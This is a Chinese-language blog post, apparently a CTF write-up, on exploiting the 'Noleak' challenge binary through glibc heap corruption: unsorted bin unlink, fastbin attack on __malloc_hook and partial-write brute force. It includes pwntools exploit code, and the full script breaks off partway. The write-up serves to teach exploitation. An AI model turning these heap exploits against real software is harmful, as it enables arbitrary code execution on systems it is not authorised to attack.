@@ -1,0 +1,610 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/ha1vk/css/main.css">
+
+
+<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="首先，介绍一下malloc_hook，这是C语言提供的一个用来包装malloc的，类似还有free_hook，具体可以查阅相关资料学习 Malloc hook我们看如下代码 12345678910111213#include &lt;stdio.h&gt;  #include &lt;malloc.h&gt;    void *fun() &#123;     __malloc_hook &#x3D; NU">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Noleak">
+<meta property="og:url" content="https://github.com/ha1vk/2019/11/13/Noleak/index.html">
+<meta property="og:site_name" content="ha1vk&#39;s blog">
+<meta property="og:description" content="首先，介绍一下malloc_hook，这是C语言提供的一个用来包装malloc的，类似还有free_hook，具体可以查阅相关资料学习 Malloc hook我们看如下代码 12345678910111213#include &lt;stdio.h&gt;  #include &lt;malloc.h&gt;    void *fun() &#123;     __malloc_hook &#x3D; NU">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/13/Noleak/image1.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/13/Noleak/image2.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/13/Noleak/image3.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/13/Noleak/image4.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/13/Noleak/image5.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/13/Noleak/image6.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/13/Noleak/image7.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/13/Noleak/image8.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/13/Noleak/image9.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/13/Noleak/image10.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/13/Noleak/image11.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/13/Noleak/image12.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/13/Noleak/image13.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/13/Noleak/image14.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/13/Noleak/image15.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/13/Noleak/image16.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/13/Noleak/image17.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/13/Noleak/image18.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/13/Noleak/image19.JPG">
+<meta property="article:published_time" content="2019-11-13T13:47:50.000Z">
+<meta property="article:modified_time" content="2025-06-21T08:04:59.008Z">
+<meta property="article:author" content="ha1vk">
+<meta property="article:tag" content="unlink">
+<meta property="article:tag" content="unsorted bin">
+<meta property="article:tag" content="partial write bypass PIE">
+<meta property="article:tag" content="fastbin">
+<meta property="article:tag" content="malloc_hook">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/ha1vk/2019/11/13/Noleak/image1.JPG">
+
+<link rel="canonical" href="https://github.com/ha1vk/2019/11/13/Noleak/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Noleak | ha1vk's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/ha1vk/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ha1vk's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2019/11/13/Noleak/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="name" content="ha1vk">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ha1vk's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Noleak
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-11-13 21:47:50" itemprop="dateCreated datePublished" datetime="2019-11-13T21:47:50+08:00">2019-11-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-21 16:04:59" itemprop="dateModified" datetime="2025-06-21T16:04:59+08:00">2025-06-21</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>首先，介绍一下malloc_hook，这是C语言提供的一个用来包装malloc的，类似还有free_hook，具体可以查阅相关资料学习</p>
+<h2 id="Malloc-hook"><a href="#Malloc-hook" class="headerlink" title="Malloc hook"></a>Malloc hook</h2><p>我们看如下代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span>  </span></span><br><span class="line">  </span><br><span class="line"><span class="type">void</span> *<span class="title function_">fun</span><span class="params">()</span> &#123;  </span><br><span class="line">   __malloc_hook = <span class="literal">NULL</span>;  </span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;hello,fun was called!\n&quot;</span>);  </span><br><span class="line">   <span class="keyword">return</span> <span class="literal">NULL</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;  </span><br><span class="line">   __malloc_hook = fun;  </span><br><span class="line">   <span class="built_in">malloc</span>(<span class="number">10</span>);  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>只要我们<strong>把 __malloc_hook赋值为某个函数的地址，那么，当我们malloc时，系统就会去调用那个函数。</strong></p>
+<h2 id="Unsorted-bin-unlink"><a href="#Unsorted-bin-unlink" class="headerlink" title="Unsorted bin unlink"></a>Unsorted bin unlink</h2><p>Unsorted bin使用<strong>双向链表维护</strong>，假如在物理地址上，chunk0后面是chunk1，我们通过chunk0溢出到chunk1，并且还在chunk0里面伪造了一个chunk，其中fd和bk指向了我们的目标附近处，溢出修改chunk1的prev_size和size，让假的chunk伪装成free的状态，这样，当我们释放chunk1时就触发了unlink，使得chunk0的指针指向了我们的目标处，接下来，我们编辑chunk0，就是编辑目标处。关于unlink的详细知识，请看我之前的一篇博客<a target="_blank" rel="noopener" href="https://blog.csdn.net/seaaseesa/article/details/102907138">https://blog.csdn.net/seaaseesa/article/details/102907138</a> 。</p>
+<p>本题，当我们free一个unsorted bin时，<strong>它的fd指针会指向libc中main_arena+88地址处，而该处的上方不远处，就是__malloc_hook</strong></p>
+<p>我们先创建一个256字节的堆，然后释放它，释放后的堆块数据结构是这样的，fd和bk设置成了main_arena+88的值</p>
+<img src="/ha1vk/2019/11/13/Noleak/image1.JPG" class="">
+
+<p><strong>__malloc_hook</strong></p>
+<img src="/ha1vk/2019/11/13/Noleak/image2.JPG" class="">
+
+<p><strong>main_arena+88处</strong></p>
+<img src="/ha1vk/2019/11/13/Noleak/image3.JPG" class="">
+
+<p>我们的目的是<strong>修改__malloc_hook，让它指向指向我们的shellcode地址</strong>，这样，当我们malloc时，就会触发我们的shellcode执行。</p>
+<h2 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h2><p>为了实现修改__malloc_hook处的数据，我们可以利用fastbin将堆块分配到此处，这样我们就能改写此处的数据了。</p>
+<p><strong>[Fastbin只检查它单向链表中每个块的size域是否符合条件]{.mark}</strong>。我们可以<strong>在__malloc_hook附近找一个可以伪造的块，想办法把这个块加入到fastbin的链表中</strong>，这样，当我们malloc分配时，就可以分配到这个块，这样我们就能修改__malloc_hook的数据了。</p>
+<p>我们发现，__malloc_hook上方不远处有一个符合条件的区域</p>
+<img src="/ha1vk/2019/11/13/Noleak/image4.JPG" class="">
+
+<p>假如,我们的块从图中的0x 7F535F744AED处开始，那么0x 7F535F744AED + 8 &#x3D; 7F535F744AF5正好是块的size域,由于size域是8字节空间，图中，它后面都是0，因此它的值就是7F，由于fastbin在malloc时，只检查size域，因此，我们可以把0x 7F535F744AED(注意这个地址是随机的，但是**[它位于__malloc_hook – 0x23处]{.mark}**，因此，我们可以来爆破，看下文partial write技术)链接到fastbin里，这样，我们重新分配时，就可以分配到这里。</p>
+<h2 id="partial-write"><a href="#partial-write" class="headerlink" title="partial write"></a>partial write</h2><p>前面的演示，我们知道了unsorted bin里最后一个块的fd会残留libc中main_arena+88的地址。(<strong>这里开启了另一个程序实例，所有里面的地址变了，不要在意</strong>)</p>
+<img src="/ha1vk/2019/11/13/Noleak/image5.JPG" class="">
+
+<p><strong>由于内存的页载入机制，PIE的随机化只能影响到单个内存页。一般一个内存页大小为0x1000，这就意味着不管地址怎么变，某条指令的后3个十六进制数字的是始终不变的，与它在二进制文件中的地址后3个十六进制是一样的，从图中，我们可以看出,main_arena在libc2.23中的地址后三个数是B78。</strong></p>
+<p>我们验证一下，以malloc_hook的地址为例，我们看到，它的静态地址是这样的</p>
+<img src="/ha1vk/2019/11/13/Noleak/image6.JPG" class="">
+
+<p>后三个数数<strong>B10</strong></p>
+<p>我们再看看它加载的地址</p>
+<img src="/ha1vk/2019/11/13/Noleak/image7.JPG" class="">
+
+<p>也是<strong>B10</strong></p>
+<p>也就是说，在同一个页里，就后2字节不一样，由于main_arena+ 88和__malloc_hook-0x23在同一个页里，现在我们<strong>已知后三个十六进制数字，那么我们只需爆破倒数第四个数字，即可得到__malloc_hook-0x23的地址。其实也不用爆破，我们就让倒数第4个数字固定，我们就假如它是2吧(随意)，只要我们多次运行程序，总有一次地址正好吻合。</strong></p>
+<p><code>attack_addr_suffix = 4096 * 2 + ((malloc_hook &amp; 0xFFF) - 0x23)  </code></p>
+<p>那么，我们需要把上面这个2字节覆盖到那个unsorted bin块的fd的低二字节，由于采用的是小端存储，正好可以覆盖，并且保留前面的字节数据。</p>
+<img src="/ha1vk/2019/11/13/Noleak/image8.JPG" class="">
+
+<p>如图，通过前一个块的溢出，我们修改了数据，我们跳过去看看</p>
+<img src="/ha1vk/2019/11/13/Noleak/image9.JPG" class="">
+
+<p>遗憾的是，这个地址不是我们的目标处，由于我们假定倒数的第四个数字是2，当前这一次，不走运，地址没有和假定吻合。但是，<strong>当我们不断重新运行程序，总有一次会吻合。那个时候我们就可以把__malloc_hook指向我们的shellcode，然后进行一次malloc操作即可getshell。</strong></p>
+<p>好了，那我们正式解题吧</p>
+<p>先看看保护机制（这一步应该放在最前面的，因为我们需要依据这个想办法）</p>
+<img src="/ha1vk/2019/11/13/Noleak/image10.JPG" class="">
+
+<p><strong>RELRO 完全开启，意味着我们不能修改GOT表。NX和PIE未开启，意味着我们可以在堆栈里存入shellcode，然后跳到那里去执行shellcode。</strong></p>
+<p>先看看程序逻辑（delete功能没有把指针清空）</p>
+<img src="/ha1vk/2019/11/13/Noleak/image11.JPG" class="">
+
+<p>编辑功能存在UAF以及溢出漏洞,size未做检查，可以溢出堆，UAF也可以编辑堆，真是漏洞百出</p>
+<img src="/ha1vk/2019/11/13/Noleak/image12.JPG" class="">
+
+<p>我们决定把shellcode存到bss段0x601020处，因为没有开启PIE,它的地址固定</p>
+<img src="/ha1vk/2019/11/13/Noleak/image13.JPG" class="">
+
+<p>我们如何向这里写入数据呢?</p>
+<p>我们需要先利用unsorted bin发生unlink，控制保存堆指针的数组。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#chunk0  </span></span><br><span class="line">create(sh,<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)  </span><br><span class="line"><span class="comment">#chunk1  </span></span><br><span class="line">create(sh,<span class="number">0x100</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x100</span>)  </span><br><span class="line"><span class="comment">#我们首先需要来完成任意写的目的，这个地址处是一个数组，用来保存堆指针的。我们需要先控制这里  </span></span><br><span class="line">target_addr = <span class="number">0x601040</span>  </span><br><span class="line"><span class="comment">#构造payload使得chunk0溢出到chunk1,修改chunk1的prev_size和size  </span></span><br><span class="line"><span class="comment">#假chunk  </span></span><br><span class="line"><span class="comment">#prev_size size  </span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>)  </span><br><span class="line"><span class="comment">#fd、bk  </span></span><br><span class="line">payload += p64(target_addr-<span class="number">0x18</span>) + p64(target_addr - <span class="number">0x10</span>)  </span><br><span class="line">payload += <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x100</span>-<span class="number">8</span>*<span class="number">4</span>)  </span><br><span class="line"><span class="comment">#修改chunk3的prev_size和size  </span></span><br><span class="line">payload += p64(<span class="number">0x100</span>) + p64(<span class="number">0x110</span>)  </span><br><span class="line">  </span><br><span class="line">edit(sh,<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)  </span><br><span class="line"><span class="comment">#发生unlink,chunk0的指针指向了保存堆指针的数组，那么我们就可以修改数组里的指针，让它们指向一些关键地方  </span></span><br><span class="line">delete(sh,<span class="number">1</span>)  </span><br></pre></td></tr></table></figure>
+
+<p>不明白unlink的可以看我之前的博客里有详解<a target="_blank" rel="noopener" href="https://blog.csdn.net/seaaseesa/article/details/102907138">https://blog.csdn.net/seaaseesa/article/details/102907138</a></p>
+<p>发生了unlink，数组里，堆0的指针变成了0x601028，那么我们可以构造payload，从0x601028处溢出到下面，把数组里的几个指针全部修改成其他我们需要的地方，这样当我们编辑对应的堆时，就是编辑这些地址处的数据。比如，现在我们edit(0)就是在编辑0x601028处的数据。</p>
+<img src="/ha1vk/2019/11/13/Noleak/image14.JPG" class="">
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span>  </span><br><span class="line">payload += p64(bss_addr)  </span><br><span class="line"><span class="comment">#将堆0指针变成bss_addr，这样我们就可以往bss里写shellcode了  </span></span><br><span class="line">edit(sh,<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)  </span><br></pre></td></tr></table></figure>
+
+<p>接下来，我们要开始来实现如何修改malloc_hook了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#chunk2  </span></span><br><span class="line">create(sh,<span class="number">0x10</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>)  </span><br><span class="line"><span class="comment">#chunk3 这个必须是unsorted bin范围  </span></span><br><span class="line">create(sh,<span class="number">0x80</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x80</span>)  </span><br><span class="line"><span class="comment">#chunk4  </span></span><br><span class="line">create(sh,<span class="number">0x65</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x65</span>)  </span><br><span class="line"><span class="comment">#chunk5  </span></span><br><span class="line">create(sh,<span class="number">0x65</span>,<span class="string">&#x27;f&#x27;</span>*<span class="number">0x65</span>)  </span><br><span class="line"><span class="comment">#free chunk3后，chunk3的fd和bk残留了libc里面的main_area + 0x88指针  </span></span><br><span class="line">delete(sh,<span class="number">3</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#覆盖低2字节，使得chunk3的FD指向了malloc hook-0x23  </span></span><br><span class="line">create(sh,<span class="number">0x80</span>,p16(attack_addr_suffix)) <span class="comment">#chunk6  </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>chunk2用于溢出到chunk3，对chunk3进行修改。</p>
+<p>我们要想实现将malloc_hook-0x23处链接到unsorted bin的链表中去，现在，假设我们覆盖chunk3的fd低2字节后，地址吻合了，那么malloc_hook-0x23已经连接到了chunk3的fd，那么我们就需要把chunk3加入到单向链表中去即可，那么我们需要通过chunk2溢出到chunk3修改chunk3的size域，使它在fastbin范围内，这里，我们就改成0x71吧</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>  </span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)  </span><br><span class="line">edit(sh,<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)  </span><br></pre></td></tr></table></figure>
+
+<p><strong>现在还有问题是，我们又不知道chunk3的地址，那么我们还需要再利用一次partial write。</strong></p>
+<p>我们先释放chunk4、chunk5，这样,形成了以chunk5为头结点的fastbin单向链表，由于chunk4和chunk3在内存中是相邻的，并且他们的地址只有最后一字节不一样，由于最后一字节我们是可以得到的，只需用IDA观察即可</p>
+<p>Chunk3</p>
+<img src="/ha1vk/2019/11/13/Noleak/image15.JPG" class="">
+
+<p>Chunk4</p>
+<img src="/ha1vk/2019/11/13/Noleak/image16.JPG" class="">
+
+<p>Chunk5的fd域</p>
+<img src="/ha1vk/2019/11/13/Noleak/image17.JPG" class="">
+
+<p>我们发现，<strong>chunk3和chunk4的地址只有最后一个字节的差别，我们可以利用UAF漏洞，把chunk5的fd的低1字节覆盖成0x30，这样，chunk5的fd就指向了chunk3</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#释放chunk4、chunk5，这样chunk5、chunk4构成了fastbin单向链表  </span></span><br><span class="line">delete(sh,<span class="number">4</span>)  </span><br><span class="line">delete(sh,<span class="number">5</span>)  </span><br><span class="line"><span class="comment">#我们覆盖chunk5的fd的低1字节，目的是让chunk5的fd指向chunk3，因为我们不确定chunk3的地址，当我们确定它地址的最后一个字节。  </span></span><br><span class="line">edit(sh,<span class="number">5</span>,<span class="number">1</span>,p8(<span class="number">0x30</span>))  </span><br></pre></td></tr></table></figure>
+
+<p>这样操作以后，形成了这样的一个fastbin链表</p>
+<p><strong>[Chunk5➡ chunk3 ➡ __malloc_hook-0x23]{.mark}</strong></p>
+<p>因此我们malloc三次后，就分配到了__malloc_hook-0x23处，我们就可以修改__malloc_hook了</p>
+<p>由于程序会检测数组里指针的个数，超过10个就不给创建了，因此我们在bss段写入shellcode时，顺便把数组里覆盖为0</p>
+<img src="/ha1vk/2019/11/13/Noleak/image18.JPG" class="">
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在bss段写入shellcode，顺便把堆指针从数组里清空，这样我们又创建多个堆了，不然超过10个就不允许创建了  </span></span><br><span class="line">payload = shellcode.ljust(<span class="number">0x20</span>,<span class="string">&#x27;\x00&#x27;</span>)  </span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">8</span>  </span><br><span class="line">edit(sh,<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)  </span><br></pre></td></tr></table></figure>
+
+<p>我们最终完整的exp脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8  </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">elf = ELF(<span class="string">&#x27;./timu&#x27;</span>)  </span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#bss段，我们待会把shellcode写入这里  </span></span><br><span class="line">bss_addr = <span class="number">0x601020</span>  </span><br><span class="line"><span class="comment">#我们的目的是把__malloc_hook指向bss_addr，这样，当我们malloc时,我们在bss里放的代码被调用  </span></span><br><span class="line"><span class="comment">#从而getshell  </span></span><br><span class="line">malloc_hook = libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]  </span><br><span class="line"><span class="comment">#我们的攻击目标,我们利用fastbin，想办法让堆分配到malloc_hook地址-0x23处  </span></span><br><span class="line"><span 